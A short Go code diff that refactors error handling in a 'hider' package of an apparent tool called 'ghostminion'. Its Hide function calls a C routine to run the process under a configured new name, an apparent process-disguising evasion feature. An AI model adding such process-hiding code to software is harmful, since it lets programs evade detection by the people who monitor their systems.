@@ -1,26 +1,27 @@
 package hider
 
+import "C"
 import (
-	"C"
-	"fmt"
+	"errors"
 	"ghostminion/config"
 	"ghostminion/logger"
 	"unsafe"
 )
 
 var (
-	lgr = logger.GetLogger()
+	lgr = logger.GetInstance()
 	cfg = config.GetInstance()
 )
 
-func Hide() {
+func Hide() error {
 	lgr.Debug("Hiding process begins")
 	cname := C.CString(cfg.Apps.Hider.NewProcessName)
 	defer C.free(unsafe.Pointer(cname))
 	ret := C.run_hider(cname)
 	if ret != 0 {
-		fmt.Println("Hider encountered an error")
+		return errors.New("hider encountered an error")
 	} else {
-		fmt.Println("Hider executed successfully")
+		lgr.Info("Hider executed successfully")
 	}
+	return nil
 }
